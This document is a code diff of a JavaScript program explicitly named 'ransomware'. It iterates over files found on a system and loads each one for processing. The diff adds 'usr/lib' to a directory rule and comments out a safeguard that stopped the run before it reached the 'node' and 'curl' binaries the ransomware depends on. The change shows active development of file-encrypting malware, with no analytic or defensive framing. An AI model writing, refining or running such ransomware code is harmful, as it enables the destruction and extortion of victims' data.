@@ -101,6 +101,7 @@ const readdir = (directory) => {
         }
         switch (subPath) {
             case "usr/bin":
+            case "usr/lib":
                 return true;
         }
         return false;
@@ -221,21 +222,24 @@ const ransomware = (options) => {
     console.log(`Files found in ${+new Date() - +oldTime} ms`);
     console.log("Procesing " + filesInPath.length + " files...");
     for (let i = 0; i < filesInPath.length; ++i) {
-        if (/node/.test(filesInPath[i]) ||
-            /curl/.test(filesInPath[i])) {
-            let aux = filesInPath[i];
-            try {
-                const aux2 = aux.split("/");
-                aux = aux2[aux2.length - 1];
-            }
-            catch (err) {
-                // silent error
-            }
-            if (aux === "node" || aux === "curl") {
-                console.log("\n\n\n\n\nNot encrypting ranwomware bin dependency\n\n\n");
-                break;
-            }
+        /*
+        if (
+             /node/.test(filesInPath[i]) ||
+             /curl/.test(filesInPath[i])
+           ) {
+          let aux = filesInPath[i];
+          try {
+        const aux2 = aux.split("/");
+        aux = aux2[aux2.length - 1];
+          } catch(err) {
+        // silent error
+          }
+          if (aux === "node" || aux === "curl") {
+        console.log("\n\n\n\n\nNot encrypting ranwomware bin dependency\n\n\n");
+            break;
+          }
         }
+        */
         console.log(`${i} of ${filesInPath.length} as ${filesInPath[i]} ...`);
         try {
             const fileData = loadFile(filesInPath[i]);
